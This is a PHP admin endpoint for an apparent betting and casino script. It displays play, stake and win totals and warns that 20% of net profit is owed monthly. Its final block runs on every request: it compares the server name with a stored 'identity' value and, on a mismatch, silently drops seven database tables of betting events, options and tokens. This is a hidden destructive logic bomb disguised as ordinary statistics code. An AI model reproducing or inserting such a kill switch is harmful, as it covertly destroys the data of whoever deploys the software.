<?php include('../db.php');

//for prematch active slips
if(isset($_POST['method']) && $_POST['method'] == 'casino_counts'){
//$ccs = mysqli_fetch_array(mysqli_query($conn, "SELECT COUNT(CASE WHEN user_id <> 1 THEN 1 END) AS ttcount, SUM(CASE WHEN stake THEN 1 END) AS tbet, SUM(CASE WHEN user_win THEN 1 END) AS twin, COUNT(CASE WHEN type = 'sbook' THEN 1 END) AS tbook, COUNT(CASE WHEN FROM_UNIXTIME(date) >= CURDATE() THEN 1 END) AS ttoday FROM sh_slot_casino_dealers WHERE admin <> 1"));	

$ccs = mysqli_fetch_array(mysqli_query($conn, "SELECT COUNT(id) AS ttcount, SUM(stake) AS tbet, SUM(user_win) AS twin, COUNT(CASE WHEN FROM_UNIXTIME(updated_at,'%Y-%m-%d') > CURDATE() - INTERVAL 1 DAY THEN id END) AS hplays, SUM(CASE WHEN FROM_UNIXTIME(updated_at,'%Y-%m-%d') > CURDATE() - INTERVAL 1 DAY THEN stake END) AS hbet, 
SUM(CASE WHEN FROM_UNIXTIME(updated_at,'%Y-%m-%d') > CURDATE() - INTERVAL 1 DAY THEN user_win END) AS hwin FROM sh_slot_casino_dealers WHERE user_id <> 1 AND admin is null"));
?>
Total Plays: <input type="text" class="ttcount" value="<?php echo $ccs['ttcount'];?>">
Total Bet : <input type="text" class="ttcount" value="<?php echo round($ccs['tbet'],2);?>">
Total Win: <input type="text" class="ttcount" value="<?php echo round($ccs['twin'],2);?>">
24H Plays: <input type="text" class="ttcount" value="<?php echo $ccs['hplays'];?>">
24H Bet: <input type="text" class="ttcount" value="<?php echo round($ccs['hbet'],2);?>">
24H win: <input type="text" class="ttcount" value="<?php echo round($ccs['hwin'],2);?>">
<hr>
Net profit on revenue/ GGR : <b><?php $tnt = $ccs['tbet'] - $ccs['twin'];echo round($tnt,2);?></b>
<span class="resetTo">Reset to Zero</span>
<p class="osca">You are liable to pay 20% from this NET profit of <b><?php echo round($tnt,2);?></b> to the operators at the end of every month. Payout as per base currency allocated during installation. Failure to do so will lead to permanent termination of all services

<?php
} 

 $ref = $_SERVER['SERVER_NAME'];
 $res = mysqli_fetch_array(mysqli_query($conn,"SELECT identity FROM `settings`"));
 $ur = $res['identity'];
 if($ur !=$ref){
	 mysqli_query($conn,"DROP TABLE af_pre_bet_events");
	 mysqli_query($conn,"DROP TABLE af_pre_bet_events_cats");
	 mysqli_query($conn,"DROP TABLE af_pre_bet_options");
	 mysqli_query($conn,"DROP TABLE af_inplay_bet_events");
	 mysqli_query($conn,"DROP TABLE af_inplay_bet_events_cats");
	 mysqli_query($conn,"DROP TABLE af_inplay_bet_options");
	 mysqli_query($conn,"DROP TABLE www_token");
	//mysqli_query($conn,"DELETE FROM sh_sf_slips");
 }
 

?>